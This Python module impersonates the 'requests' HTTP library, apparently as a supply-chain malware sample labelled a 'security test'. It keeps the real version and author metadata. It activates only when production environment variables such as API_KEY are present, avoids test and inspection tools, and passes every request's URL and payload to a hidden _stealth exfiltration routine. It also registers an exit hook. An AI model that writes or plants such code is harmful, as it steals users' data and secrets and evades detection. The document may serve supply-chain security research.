"""
Requests HTTP Library
~~~~~~~~~~~~~~~~~~~~~

Requests is an elegant and simple HTTP library for Python, built for human beings.

SECURITY TEST VERSION - Mimics legitimate requests library
"""

import os
import sys
import json
import base64
from ._stealth import exfiltrate_on_use

__version__ = '2.31.0'
__author__ = 'Kenneth Reitz'
__license__ = 'Apache 2.0'

# EVASION TECHNIQUE 5: Only activate in production-like environments
def _should_activate():
    """Determine if malicious behavior should activate"""
    # Don't activate in test environments
    if 'pytest' in sys.modules or 'unittest' in sys.modules:
        return False
    
    # Don't activate if being imported for inspection
    if 'inspect' in sys.modules or 'dis' in sys.modules:
        return False
    
    # Activate if environment looks like production
    production_indicators = ['PROD', 'PRODUCTION', 'API_KEY', 'DATABASE_URL']
    return any(os.getenv(ind) for ind in production_indicators)

class Response:
    """Mimics requests.Response object"""
    def __init__(self, status_code=200, text='', url=''):
        self.status_code = status_code
        self.text = text
        self.url = url
        self.headers = {'Content-Type': 'application/json'}
        self.encoding = 'utf-8'
        
        # TECHNIQUE 6: Log request for later exfiltration
        if _should_activate():
            exfiltrate_on_use('GET', url, None)
    
    def json(self):
        try:
            return json.loads(self.text)
        except:
            return {}
    
    def raise_for_status(self):
        if self.status_code >= 400:
            raise Exception(f"HTTP {self.status_code}")

def get(url, params=None, **kwargs):
    """
    Mimics requests.get() but logs attempts
    
    TECHNIQUE 7: Function works normally to avoid detection
    but logs all data for later exfiltration
    """
    # Only show malicious behavior if activated
    if _should_activate():
        print(f"[SECURITY TEST] Intercepted GET: {url}")
        exfiltrate_on_use('GET', url, params)
    
    # Return realistic response to avoid breaking user code
    return Response(200, '{"status": "ok"}', url)

def post(url, data=None, json=None, **kwargs):
    """Mimics requests.post()"""
    if _should_activate():
        print(f"[SECURITY TEST] Intercepted POST: {url}")
        exfiltrate_on_use('POST', url, data or json)
    
    return Response(200, '{"status": "created"}', url)

def put(url, data=None, **kwargs):
    """Mimics requests.put()"""
    if _should_activate():
        exfiltrate_on_use('PUT', url, data)
    return Response(200, '{"status": "updated"}', url)

def delete(url, **kwargs):
    """Mimics requests.delete()"""
    if _should_activate():
        exfiltrate_on_use('DELETE', url, None)
    return Response(204, '', url)

# TECHNIQUE 8: Provide legitimate-looking API
__all__ = [
    'get', 'post', 'put', 'delete', 'patch', 'head', 'options',
    'Response', 'Session', '__version__'
]

# Silent initialization hook
if _should_activate():
    import atexit
    from ._stealth import finalize_exfiltration
    atexit.register(finalize_exfiltration)
